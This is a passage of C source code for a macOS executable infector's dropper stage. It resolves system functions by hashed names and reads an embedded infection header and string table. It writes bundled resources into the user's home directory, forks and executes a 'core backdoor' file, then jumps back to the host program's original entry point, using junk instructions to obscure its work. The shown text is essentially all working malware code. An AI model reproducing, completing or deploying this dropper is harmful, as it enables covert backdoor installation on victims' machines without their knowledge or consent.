		"subl $0xD2, %%eax\n"
		"movl %%eax, %0\n"
		: "=m"(baseAddress)
		:
	);
#endif

#ifndef LOADER_DEBUG
	int pid = 0;

	char *userHome                  = NULL;
	char *destinationDir            = NULL;
	char *filePointer               = NULL;
	char *backdoorPath              = NULL;
	int backdoorIsAlreadyInstalled  = 0;
	int errorOnInstall              = 0;

	unsigned int offset         = (unsigned int)(infectionBase) + sizeof (infectionHeader);
	infectionHeader *infection  = (infectionHeader *)infectionBase;
	stringTable *stringList     = (stringTable *)offset;
	resourceHeader *resource    = NULL;
	char *strings[16];
#endif

	//
	// dyld function pointer prototypes
	//
	uint32_t (*_idyld_image_count)                        (void);
	const char *(*_idyld_get_image_name)                  (uint32_t);
	const struct mach_header *(*_idyld_get_image_header)  (uint32_t);

	//
	// libSystem function pointer prototypes
	//
	int   (*iopen)			(const char *, int, ...);
	long  (*ilseek)			(int, _mOff_t, int);
	int   (*iclose)			(int);
	int   (*ichdir)			(const char *);
	int   (*iwrite)			(int, const void *, int);
	int   (*ipwrite)		(int, const void *, int, _mOff_t);
	int   (*istat)			(const char *, struct stat *);
	void *(*immap)			(void *, _mSize_t, int, int, int, _mOff_t);
	int   (*imunmap)		(void *, _mSize_t);
	void *(*imemcpy)		(void *, const void *, int);
	int   (*isprintf)		(char *, const char *, ...);
	int   (*iprintf)		(const char *, ...);
	char *(*igetenv)		(const char *);
	int   (*imkdir)			(const char *, unsigned int);
	int   (*iexecve)		(const char *, char *, char *);
	int   (*iexecl)			(const char *, const char *, ...);
	int   (*ifork)			(void);
	char *(*istrncpy)		(char *, const char *, _mSize_t);
	void *(*imalloc)		(int);
	void  (*ifree)			(void *);
	unsigned int (*isleep)	(unsigned int);
	int (*isigaction)		(int sig, sigaction *act, sigaction *oact);

	void *libdyldAddress    = mapLibDyld();
	void *libsystemcAddress = mapLibSystemC();
	void *libsystemkAddress = mapLibSystemK();

	unsigned int imageBase  = (unsigned int)dyldBaseAddress;

	if (osx_version == 1)
		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_snow((byte *)imageBase, dyld_image_countHash));
	else
		_idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol_lion((byte *)imageBase, dyld_image_countHash));

	if ((int)_idyld_image_count != -1)
	{
		imageCount = _idyld_image_count ();

#ifdef LOADER_DEBUG
		printf ("[ii] imageCount: %d\n", imageCount);
#endif
		if (osx_version == 1)
		{
			_idyld_get_image_name = (const char *(__cdecl *)(uint32_t))
				(findSymbol_snow((byte *)imageBase, dyld_get_image_nameHash));
			_idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))
				(findSymbol_snow((byte *)imageBase, dyld_get_image_headerHash));
		}
		else
		{
			_idyld_get_image_name = (const char *(__cdecl *)(uint32_t))
				(findSymbol_lion((byte *)imageBase, dyld_get_image_nameHash));
			_idyld_get_image_header = (const mach_header *(__cdecl *)(uint32_t))
				(findSymbol_lion((byte *)imageBase, dyld_get_image_headerHash));
		}

		const struct mach_header *m_header = NULL;

		if ((int)_idyld_get_image_name != -1)
		{
			if (osx_version == 1)
			{
				// We are on Leopard / Snow Leopard
				for (z = 0; z < imageCount; z++)
				{
					imageName = _idyld_get_image_name (z);
					m_header  = _idyld_get_image_header (z);
#ifdef LOADER_DEBUG
					printf ("[ii] image: %s\n", imageName);
#endif
					if (sdbm ((unsigned char *)imageName) == libSystemHash)
					{
						if ((int)_idyld_get_image_header != -1)
						{
							libSystemAddress = mapLibSystem();

							if (libSystemAddress == NULL)
								doExit();

							iopen     = (int   (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, openHash) + (unsigned int)m_header);
							ilseek    = (long  (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
							iclose    = (int   (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, closeHash) + (unsigned int)m_header);
							ichdir    = (int   (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, chdirHash) + (unsigned int)m_header);
							iwrite    = (int   (__cdecl *)(int, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, writeHash) + (unsigned int)m_header);
							ipwrite   = (int   (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
							istat     = (int   (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
							immap     = (void *(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
							imunmap   = (int   (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, munmapHash) + (unsigned int)m_header);
							imemcpy   = (void *(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, memcpyHash) + (unsigned int)m_header);
							isprintf  = (int   (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, sprintfHash) + (unsigned int)m_header);
							iprintf   = (int   (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, printfHash) + (unsigned int)m_header);
							igetenv   = (char *(__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, getenvHash) + (unsigned int)m_header);
							imkdir    = (int   (__cdecl *)(const char *, unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, mkdirHash) + (unsigned int)m_header);
							iexecve   = (int   (__cdecl *)(const char *, char *, char *))(findSymbolInFatBinary ((byte *)libSystemAddress, execveHash) + (unsigned int)m_header);
							iexecl    = (int   (__cdecl *)(const char *, const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, execlHash) + (unsigned int)m_header);
							ifork     = (int   (__cdecl *)(void))(findSymbolInFatBinary ((byte *)libSystemAddress, forkHash) + (unsigned int)m_header);
							istrncpy  = (char *(__cdecl *)(char *, const char *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, strncpyHash) + (unsigned int)m_header);
							imalloc   = (void *(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, mallocHash) + (unsigned int)m_header);
							ifree     = (void  (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libSystemAddress, freeHash) + (unsigned int)m_header);
							isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, sleepHash) + (unsigned int)m_header);
							isigaction = (int (__cdecl *)(int, sigaction *, sigaction *))(findSymbolInFatBinary ((byte *)libSystemAddress, sigactionHash) + (unsigned int)m_header);
						}

						break;
					}
				}
			}
			else
			{
				// We are on Lion
				for (z = 0; z < imageCount; z++)
				{
					imageName = _idyld_get_image_name(z);
					m_header  = _idyld_get_image_header(z);

#ifdef LOADER_DEBUG
					printf ("[ii] image: %s\n", imageName);
#endif
					unsigned int hash = sdbm((unsigned char *)imageName);
					if (hash == libsystemkHash)
					{
						if (libsystemkAddress == NULL)
							doExit(); // FIXME: OEP_CALL ?

						iopen     = (int   (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libsystemkAddress, openHash) + (unsigned int)m_header);
						ilseek    = (long  (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, lseekHash) + (unsigned int)m_header);
						iclose    = (int   (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libsystemkAddress, closeHash) + (unsigned int)m_header);
						ichdir    = (int   (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libsystemkAddress, chdirHash) + (unsigned int)m_header);
						iwrite    = (int   (__cdecl *)(int, const void *, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, writeHash) + (unsigned int)m_header);
						ipwrite   = (int   (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, pwriteHash) + (unsigned int)m_header);
						istat     = (int   (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libsystemkAddress, statHash) + (unsigned int)m_header);
						immap     = (void *(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, mmapHash) + (unsigned int)m_header);
						imunmap   = (int   (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libsystemkAddress, munmapHash) + (unsigned int)m_header);
						imkdir    = (int   (__cdecl *)(const char *, unsigned int))(findSymbolInFatBinary ((byte *)libsystemkAddress, mkdirHash) + (unsigned int)m_header);
						iexecve   = (int   (__cdecl *)(const char *, char *, char *))(findSymbolInFatBinary ((byte *)libsystemkAddress, execveHash) + (unsigned int)m_header);
					}
					else if (hash == libsystemcHash)
					{
						if (libsystemcAddress == NULL)
							doExit(); // OEP_CALL?? FIXME

						imemcpy   = (void *(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libsystemcAddress, memcpyHash) + (unsigned int)m_header);
						isprintf  = (int   (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libsystemcAddress, sprintfHash) + (unsigned int)m_header);
						iprintf   = (int   (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libsystemcAddress, printfHash) + (unsigned int)m_header);
						igetenv   = (char *(__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libsystemcAddress, getenvHash) + (unsigned int)m_header);
						iexecl    = (int   (__cdecl *)(const char *, const char *,...))(findSymbolInFatBinary ((byte *)libsystemcAddress, execlHash) + (unsigned int)m_header);
						ifork     = (int   (__cdecl *)(void))(findSymbolInFatBinary ((byte *)libsystemcAddress, forkHash) + (unsigned int)m_header);
						istrncpy  = (char *(__cdecl *)(char *, const char *, _mSize_t))(findSymbolInFatBinary ((byte *)libsystemcAddress, strncpyHash) + (unsigned int)m_header);
						imalloc   = (void *(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libsystemcAddress, mallocHash) + (unsigned int)m_header);
						ifree     = (void  (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libsystemcAddress, freeHash) + (unsigned int)m_header);
						isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libsystemcAddress, sleepHash) + (unsigned int)m_header);
						isigaction = (int (__cdecl *)(int, sigaction *, sigaction *))(findSymbolInFatBinary ((byte *)libsystemcAddress, sigactionHash) + (unsigned int)m_header);
					}
				}
			}

			// first restore signal handler
			new_act.sig_action = 0; // SIG_DFL
			isigaction(0xb, &new_act, &old_act); // 0xb == SIGSEGV

#ifndef LOADER_DEBUG
			for (i = 0; i < infection->numberOfStrings; i++)	
			{
				strings[i] = stringList->value;
				offset += sizeof (stringTable);
				stringList = (stringTable *)offset;
			}

			void *envVariableName = (char *)strings[0];

			if (igetenv != 0)
				userHome = (char *) igetenv ((const char *)envVariableName);
			else
				errorOnInstall = 1; // FIXME: doExit() or goto EOPCALL

			char *backdoorDropPath = (char *)imalloc(128);
			isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);
			backdoorPath = (char *)imalloc (256);
			char *backdoorDir = NULL;

			offset = (unsigned int)infectionBase
				+ sizeof (infectionHeader)
				+ sizeof (stringTable) * infection->numberOfStrings
				+ infection->dropperSize
				+ crtStartSize + 1;

			//
			// Cycle through and drop all the resources
			//
			for (i = 0; i < infection->numberOfResources; i++)
			{
				char *destinationPath = (char *) imalloc (256);
				destinationDir = (char *) imalloc (128);

				resource = (resourceHeader *)offset;
				isprintf (destinationDir, strings[2], backdoorDropPath, resource->path);

				if (backdoorDir == NULL)
				{
					backdoorDir = (char *)imalloc (256);
					isprintf (backdoorDir, strings[2], backdoorDropPath, resource->path);
				}

				imkdir (destinationDir, 0755);
				isprintf (destinationPath, strings[2], destinationDir, resource->name);

				if (resource->type == RESOURCE_CORE)
				{
					istrncpy (backdoorPath, destinationPath, 256);

					if ((fd = iopen (destinationPath, O_CREAT | O_EXCL, 0755)) == -1)
						backdoorIsAlreadyInstalled = 1;
				}

				int resSize = resource->size;
				offset += sizeof (resourceHeader);

				if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
				{
					if (iwrite (fd, (const void *)offset, resSize) == -1)
						errorOnInstall = 1;

					iclose (fd);
				}

				offset += resSize;

				ifree (destinationDir);
				ifree (destinationPath);
			}

			ifree (backdoorDropPath);

			//
			// Execute the core backdoor file
			//
			if (//backdoorIsAlreadyInstalled == 0
				errorOnInstall == 0)
			{
				if ((pid = ifork()) == 0)
				{
					ichdir (backdoorDir);
					iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
				}
				else if (pid > 0)
				{
					// jump to the original entry point
					//doExit ();
				}
				else if (pid < 0)
				{
					//doExit ();
				}
			}

			ifree (backdoorDir);
			ifree (backdoorPath);

OEP_CALL:
#ifdef WIN32
			// Here we have to remove the fixed base (0x1000) and add
			// the randomized one 	

			uint32_t baseAddress = (uint32_t)_idyld_get_image_header(0);
			uint32_t originalEP = infection->originalEP - 0x1000 + (uint32_t)baseAddress;

			//
			// Restore register state and jump to the original entrypoint
			// ebp will be disarded by the crt initializer, so we can use it for the jump
			//
			__asm__ __volatile__ {
					mov eax, _eax
	
				push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx

					mov ecx, _ecx
					mov edx, _edx
				
				push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx

					mov ebx, _ebx
					mov esi, _esi
					mov edi, _edi
					mov esp, _esp
					
				push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx

					mov ebp, originalEP; 

				mov eax, eax
				add eax, 0
				mov ebx, ebx

					add ebp, 0x30	// start right where we left, FIXME: what about EP different from crtStart??
					jmp ebp
			}

#else
			__asm__ __volatile__ (
				"movl  %0, %%eax\n"
				"movl  $0x1000, %%ebx\n"
				"movl  $0x5, %%ecx\n"
				:
			:"m"(infection->originalEP)
				);

			__asm__ __volatile__ (
				"movl  %0, %%esp\n"
				"jmp   *%%eax\n"
				:
			:"m"(esp)
				);
#endif
#endif          
		}
	}
}

void dropperEnd ()
{
	int b = 1;
}
